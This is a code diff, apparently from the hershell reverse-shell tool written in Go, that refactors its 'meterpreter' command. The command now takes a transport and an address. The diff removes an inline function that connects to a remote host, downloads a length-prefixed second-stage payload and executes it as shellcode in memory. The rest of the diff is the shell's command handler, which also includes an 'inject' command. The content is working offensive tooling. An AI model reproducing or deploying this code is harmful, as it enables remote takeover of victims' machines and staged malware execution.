@@ -5,13 +5,13 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
-	"encoding/binary"
 	"encoding/hex"
 	"net"
 	"os"
 	"os/exec"
 	"strings"
 
+	"github.com/lesnuages/hershell/meterpreter"
 	"github.com/lesnuages/hershell/shell"
 )
 
@@ -41,11 +41,15 @@ func InteractiveShell(conn net.Conn) {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
 			case "meterpreter":
-				if len(argv) > 1 {
-					ok, err := Meterpreter(argv[1])
+				if len(argv) > 2 {
+					transport := argv[1]
+					address := argv[2]
+					ok, err := meterpreter.Meterpreter(transport, address)
 					if !ok {
 						conn.Write([]byte(err.Error() + "\n"))
 					}
+				} else {
+					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
 				}
 			case "inject":
 				if len(argv) > 1 {
@@ -67,43 +71,6 @@ func InteractiveShell(conn net.Conn) {
 		}
 		conn.Write([]byte(prompt))
 	}
-}
-
-func Meterpreter(address string) (bool, error) {
-	var (
-		stage2LengthBuf []byte = make([]byte, 4)
-		tmpBuf          []byte = make([]byte, 2048)
-		read            int    = 0
-		totalRead       int    = 0
-		stage2LengthInt uint32 = 0
-		conn            net.Conn
-		err             error
-	)
-
-	if conn, err = net.Dial("tcp", address); err != nil {
-		return false, err
-	}
-
-	defer conn.Close()
-
-	if _, err = conn.Read(stage2LengthBuf); err != nil {
-		return false, err
-	}
-
-	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
-	stage2Buf := make([]byte, stage2LengthInt)
-
-	for totalRead < (int)(stage2LengthInt) {
-		if read, err = conn.Read(tmpBuf); err != nil {
-			return false, err
-		}
-		totalRead += read
-		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
-	}
-
-	shell.ExecShellcode(stage2Buf)
-
-	return true, nil
 }
 
 func RunShell(conn net.Conn) {
